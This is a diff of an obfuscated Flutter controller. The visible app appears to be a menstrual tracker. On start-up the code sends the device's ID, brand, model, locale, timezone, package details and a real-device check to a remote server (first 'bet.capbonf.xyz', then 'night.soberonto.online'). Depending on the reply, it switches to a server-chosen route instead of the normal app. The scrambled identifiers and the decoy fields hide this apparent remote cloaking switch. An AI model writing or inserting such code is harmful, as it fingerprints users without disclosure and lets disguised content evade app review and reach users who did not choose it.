@@ -8,133 +8,141 @@ import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:get/get.dart';
 import 'package:package_info_plus/package_info_plus.dart';
+import 'package:shared_preferences/shared_preferences.dart';
+
+void statusCheck() async {
+  var connectResult = await (Connectivity().checkConnectivity());
+  if(connectResult == ConnectivityResult.none){
+    Get.toNamed("/uninit");
+  }
+}
 
 class PageLogic extends GetxController {
 
-  var wmtdyogjka = RxBool(false);
-  var bfphuxtcq = RxBool(true);
-  var smjkuwe = RxString("");
-  var kathleen = RxBool(false);
-  var bogisich = RxBool(true);
-  final ihyoagzwu = Dio();
+
+  var bgitae = RxBool(false);
+  var seitokq = RxBool(true);
+  var wkpc = RxString("");
+  var jana = RxBool(false);
+  var mills = RxBool(true);
+  final smbvdzu = Dio();
 
 
   InAppWebViewController? webViewController;
 
-  void checkNetwork() async {
-    var connectResult = await (Connectivity().checkConnectivity());
-    if(connectResult == ConnectivityResult.none){
-      Get.toNamed("/noNetwork");
-    }
-  }
-
   @override
   void onInit() {
-    checkNetwork();
+    statusCheck();
     super.onInit();
-    erkom();
+    icbrtvpj();
   }
 
 
-  Future<void> erkom() async {
+  Future<void> icbrtvpj() async {
 
-    kathleen.value = true;
-    bogisich.value = true;
-    bfphuxtcq.value = false;
+    jana.value = true;
+    mills.value = true;
+    seitokq.value = false;
 
-    ihyoagzwu.post("https://bet.capbonf.xyz/LQEWCJ3RJGDH",data: await tmehxduv()).then((value) {
-      var ypne = value.data["ypne"] as String;
-      var wfpce = value.data["wfpce"] as bool;
-      if (wfpce) {
-        smjkuwe.value = ypne;
-        graciela();
+    smbvdzu.post("https://night.soberonto.online/bqdkpugeamojcyfwhvnxslzrt",data: await ghcawont()).then((value) {
+      var awohps = value.data["awohps"] as String;
+      var sxpectgu = value.data["sxpectgu"] as bool;
+      if (sxpectgu) {
+        wkpc.value = awohps;
+        chelsey();
       } else {
-        conroy();
+        stanton();
       }
     }).catchError((e) {
-      bfphuxtcq.value = true;
-      bogisich.value = true;
-      kathleen.value = false;
+      seitokq.value = true;
+      mills.value = true;
+      jana.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> tmehxduv() async {
-    final DeviceInfoPlugin iozj = DeviceInfoPlugin();
-    PackageInfo scwkfbey_rcbkntmh = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> ghcawont() async {
+    final DeviceInfoPlugin jstl = DeviceInfoPlugin();
+    PackageInfo bimwrn_fqykg = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var rcbqd = Platform.localeName;
-    var uNxFS = currentTimeZone;
+    var xnjfc = Platform.localeName;
+    var tbyen = currentTimeZone;
 
-    var VkBMfe = scwkfbey_rcbkntmh.packageName;
-    var ueUOlTcR = scwkfbey_rcbkntmh.version;
-    var upYDU = scwkfbey_rcbkntmh.buildNumber;
+    var unkirpfm = bimwrn_fqykg.packageName;
+    var epksryh = bimwrn_fqykg.version;
+    var iwsrt = bimwrn_fqykg.buildNumber;
 
-    var qzbYQ = scwkfbey_rcbkntmh.appName;
-    var CNMWxcfg = "";
-    var efrainSchaden = "";
-    var ExNCqs  = "";
-    var ZoWh = "";
-    var melynaSchumm = "";
-    var johnathanVandervort = "";
-    var zPpuV = "";
-    var marionPagac = "";
-    var marilouVon = "";
-    var conradHeidenreich = "";
+    var aogd = bimwrn_fqykg.appName;
+    var kaylinZboncak = "";
+    var bdlhrin  = "";
+    var larhpjdi = "";
+    var mireilleAnkunding = "";
+    var darrylBecker = "";
+    var kaitlynBailey = "";
+    var vesuxifp = "";
+    var michaelaGaylord = "";
+    var augustineKautzer = "";
+    var mckaylaWeissnat = "";
 
 
-    var kplbZP = false;
+    var lxoyhuj = "";
+    var demarcoBalistreri = "";
+    var jsxvikzp = false;
 
     if (GetPlatform.isAndroid) {
-      zPpuV = "android";
-      var nixvyedzjq = await iozj.androidInfo;
+      lxoyhuj = "android";
+      var dlcmkvb = await jstl.androidInfo;
 
-      ZoWh = nixvyedzjq.brand;
+      larhpjdi = dlcmkvb.brand;
 
-      CNMWxcfg  = nixvyedzjq.model;
-      ExNCqs = nixvyedzjq.id;
+      vesuxifp  = dlcmkvb.model;
+      bdlhrin = dlcmkvb.id;
 
-      kplbZP = nixvyedzjq.isPhysicalDevice;
+      jsxvikzp = dlcmkvb.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      zPpuV = "ios";
-      var rxwqcud = await iozj.iosInfo;
-      ZoWh = rxwqcud.name;
-      CNMWxcfg = rxwqcud.model;
+      lxoyhuj = "ios";
+      var vobtni = await jstl.iosInfo;
+      larhpjdi = vobtni.name;
+      vesuxifp = vobtni.model;
 
-      ExNCqs = rxwqcud.identifierForVendor ?? "";
-      kplbZP  = rxwqcud.isPhysicalDevice;
+      bdlhrin = vobtni.identifierForVendor ?? "";
+      jsxvikzp  = vobtni.isPhysicalDevice;
     }
-
     var res = {
-      "conradHeidenreich" : conradHeidenreich,
-      "upYDU": upYDU,
-      "ueUOlTcR": ueUOlTcR,
-      "johnathanVandervort" : johnathanVandervort,
-      "rcbqd": rcbqd,
-      "VkBMfe": VkBMfe,
-      "CNMWxcfg": CNMWxcfg,
-      "uNxFS": uNxFS,
-      "ExNCqs": ExNCqs,
-      "zPpuV": zPpuV,
-      "ZoWh": ZoWh,
-      "qzbYQ": qzbYQ,
-      "kplbZP": kplbZP,
-      "efrainSchaden" : efrainSchaden,
-      "marionPagac" : marionPagac,
-      "melynaSchumm" : melynaSchumm,
-      "marilouVon" : marilouVon,
+      "aogd": aogd,
+      "unkirpfm": unkirpfm,
+      "mckaylaWeissnat" : mckaylaWeissnat,
+      "vesuxifp": vesuxifp,
+      "tbyen": tbyen,
+      "demarcoBalistreri" : demarcoBalistreri,
+      "larhpjdi": larhpjdi,
+      "kaitlynBailey" : kaitlynBailey,
+      "bdlhrin": bdlhrin,
+      "xnjfc": xnjfc,
+      "lxoyhuj": lxoyhuj,
+      "jsxvikzp": jsxvikzp,
+      "mireilleAnkunding" : mireilleAnkunding,
+      "epksryh": epksryh,
+      "darrylBecker" : darrylBecker,
+      "michaelaGaylord" : michaelaGaylord,
+      "iwsrt": iwsrt,
+      "augustineKautzer" : augustineKautzer,
+      "kaylinZboncak" : kaylinZboncak,
 
     };
     return res;
   }
 
-  Future<void> conroy() async {
-    Get.offAllNamed("/linksTab");
+  Future<void> stanton() async {
+    final SharedPreferences prefs = await SharedPreferences.getInstance();
+    List<String> select = prefs.getStringList('menstrualSelect') ?? [];
+    bool selectBool = select.isNotEmpty;
+    Get.offAllNamed( selectBool ? '/tab' : '/birthday');
   }
 
-  Future<void> graciela() async {
-    Get.offAllNamed("/linksGo");
+  Future<void> chelsey() async {
+    Get.offAllNamed("/guess");
   }
 
 }
